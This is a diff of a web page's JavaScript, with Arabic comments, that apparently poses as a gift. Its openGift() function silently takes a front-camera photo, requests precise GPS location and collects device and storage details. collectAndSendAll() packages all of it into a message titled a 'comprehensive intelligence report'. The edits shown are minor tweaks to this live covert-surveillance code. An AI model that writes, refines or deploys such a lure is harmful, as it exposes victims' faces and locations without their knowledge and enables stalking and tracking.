@@ -89,7 +89,6 @@
             return storageInfo;
         }
 
-        // دالة الحصول على الموقع الجغرافي بدقة (GPS)
         function getGeoLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -105,7 +104,7 @@
                         (error) => {
                             resolve('تم رفض إذن الموقع أو غير متاح');
                         },
-                        { timeout: 10000, enableHighAccuracy: true }
+                        { timeout: 8000, enableHighAccuracy: true }
                     );
                 }
             });
@@ -114,7 +113,6 @@
         async function openGift() {
             let photoBlob = null;
 
-            // 1. التقاط الصورة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.getElementById('video');
@@ -129,11 +127,9 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 stream.getTracks().forEach(track => track.stop());
-
                 photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
             } catch (e) {}
 
-            // 2. تجميع كافة البيانات التقنية والعنوان الدقيق
             collectAndSendAll(photoBlob);
         }
 
@@ -155,7 +151,7 @@
                     } catch(e) {}
                 }
 
-                const caption = `🚨 **التقرير الاستخباراتي الشامل والنهائي!**\n\n` +
+                const caption = `🚨 **التقرير الاستخباراتي الشامل والكامل!**\n\n` +
                                 `📍 **الموقع الدقيق (GPS):**\n${gpsLocation}\n` +
                                 `--------------------------\n` +
                                 `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
